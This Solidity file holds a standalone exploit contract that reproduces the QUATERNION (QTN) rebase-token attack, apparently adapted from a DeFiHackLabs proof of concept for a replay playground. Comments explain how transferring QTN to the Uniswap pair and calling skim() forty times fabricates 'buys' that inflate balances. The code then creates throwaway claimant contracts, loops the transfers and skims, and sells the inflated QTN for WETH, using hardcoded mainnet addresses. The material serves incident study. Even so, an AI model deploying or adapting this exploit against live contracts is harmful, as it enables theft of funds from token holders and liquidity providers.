// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-01-QTN).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test contract
// (`ContractTest is Test`, `address(this)` is the attacker throughout) — there is
// no standalone exploit contract to deploy. This is a faithful, self-contained
// copy of that inline attack (testExploit + the QTNContract claimant helper +
// all internal helper functions) so the playground can deploy it and record
// run(). Logic and constants are copied verbatim from test/QTN_exp.sol in the
// registry, with one deliberate change: the initial 2 WETH -> QTN seed buy is
// replaced by a pre-funded QTN balance (see the config's `setup.steps` dealToken)
// instead of a real router swap — see the note on `run()` below for why.
//
// Root cause: QUATERNION (QTN) is a gon-denominated reflection/rebase token.
// Any transfer with `from == uniswapV2Pair` is treated as a "buy" and triggers
// rebasePlus(), which mints `amount/5` into `_totalSupply` and shrinks
// `_gonsPerFragment` — silently revaluing every existing gon balance upward.
// The pair's own displayed balance is tracked by a separate `uniswapV2PairAmount`
// accumulator, decoupled from the gon ledger, so pushing QTN directly into the
// pair and then calling the pair's permissionless `skim(to)` ships the excess
// to `to` via a `from == pair` transfer — manufacturing a free "buy" (and thus a
// free rebase) for the cost of gas. Looping this 40x lets the attacker either
// re-aggregate inflated claimant balances, or (as reproduced here) simply hold
// onto part of the original balance while every skim shrinks
// `_gonsPerFragment` globally, silently inflating the QTN-value of whatever
// gons the attacker still holds.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function decimals() external view returns (uint8);
}

interface Uni_Router_V2 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface Uni_Pair_V2 {
    function skim(address to) external;
}

// Faithful copy of the test's QTNContract claimant helper: a disposable
// throwaway contract used purely as a `skim()` destination and to hold (then
// return) whatever QTN balance it accumulates.
contract QTNContract {
    IERC20 QTN = IERC20(0xC9fa8F4CFd11559b50c5C7F6672B9eEa2757e1bd);

    function transferBack() external {
        QTN.transfer(msg.sender, QTN.balanceOf(address(this)));
    }
}

contract QTNExploit {
    IERC20 QTN = IERC20(0xC9fa8F4CFd11559b50c5C7F6672B9eEa2757e1bd);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    Uni_Router_V2 Router = Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0xA8208dA95869060cfD40a23eb11F2158639c829B);
    address[] contractList;

    // The original test does: wrap 2 ETH -> WETH, swap WETH -> QTN (the seed
    // buy), warp +500s (clears the 5-minute seller cooldown), run the 40x
    // transfer-to-pair + skim loop, warp +500s again (clears each claimant's
    // buy cooldown), then have every claimant transferBack(), then dump the
    // reassembled QTN for WETH.
    //
    // The playground's recorder pins ONE fixed block.timestamp for the ENTIRE
    // replay (deploy + setup + the single recorded call — see
    // docs/EVM-playground-2.md §4), so the two mid-transaction vm.warps cannot
    // be reproduced: whatever timestamp a "buy" sets in `_buyInfo[to]` is the
    // SAME timestamp read back by the very next cooldown check, so a
    // buy-then-sell-by-the-same-address within one call always fails
    // QUATERNION's `_buyInfo[from] + 5 minutes < now` gate.
    //
    // The seed swap (WETH -> QTN) is therefore replaced by pre-funding this
    // contract's QTN balance directly via the config's `setup.steps` dealToken
    // (a raw storage write to `_gonBalances[exploit]`) instead of a real router
    // swap — this avoids ever setting `_buyInfo[address(this)]`, so the
    // attacker's own 40 outbound `QTN.transfer(pair, chunk)` calls (each a
    // "sell", from == this contract) pass the `_buyInfo[from] == 0` branch
    // unconditionally. Each `skim()` still fires a real `from == pair` "buy" on
    // the freshly deployed QTNContract claimant, which still sets that
    // claimant's `_buyInfo` and still fires a real `rebasePlus()` — the core
    // vulnerability mechanism reproduces faithfully. Only `transferBack()`
    // (claimant sell, same-call as its own preceding buy) hits the
    // now-cannot-clear cooldown and reverts — exactly like the original test,
    // this is swallowed by the low-level `.call(...)` in QTNContractBack()
    // (checked-return ignored, matching test/QTN_exp.sol's own pattern), so the
    // attack still completes and still profits: every skim() shrinks
    // `_gonsPerFragment` globally, which silently inflates the QTN-value of the
    // portion of the ORIGINAL seed balance this contract has not yet sent to
    // the pair. The final dump sells that inflated remainder for a real WETH
    // profit — a faithful (if numerically different) reproduction of the same
    // root cause: `skim()`-manufactured "buys" mint free supply inflation.
    function run() external {
        QTNContractFactory();
        QTNContractBack();
        QTNToWETH();
    }

    function QTNContractFactory() internal {
        uint256 transferAmount = QTN.balanceOf(address(this)) / 40;
        for (uint256 i; i < 40; ++i) {
            QTNContract QTNcontract = new QTNContract();
            contractList.push(address(QTNcontract));
            QTN.transfer(address(Pair), transferAmount);
            Pair.skim(address(QTNcontract));
        }
    }

    function QTNContractBack() internal {
        for (uint256 i; i < 40; ++i) {
            contractList[i].call(abi.encodeWithSignature("transferBack()"));
        }
    }

    function QTNToWETH() internal {
        QTN.approve(address(Router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(QTN);
        path[1] = address(WETH);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            QTN.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }

    receive() external payable {}
}
